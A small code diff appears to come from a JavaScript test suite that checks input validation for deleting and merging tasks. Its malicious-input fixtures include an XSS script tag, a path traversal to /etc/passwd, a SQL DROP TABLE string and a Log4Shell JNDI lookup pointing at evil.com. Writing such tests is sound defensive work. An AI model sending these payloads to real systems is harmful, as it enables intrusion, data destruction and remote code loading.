@@ -59,7 +59,7 @@ describe('Delete and Merge Task Operations Validation', () => {
           '<script>alert("xss")</script>',
           '../../etc/passwd',
           'DROP TABLE tasks;',
-          '${jndi:ldap://evil.com/a}'
+          '${jndi:ldap://evil.com/a}' // eslint-disable-line no-template-curly-in-string
         ];
 
         maliciousInputs.forEach(input => {
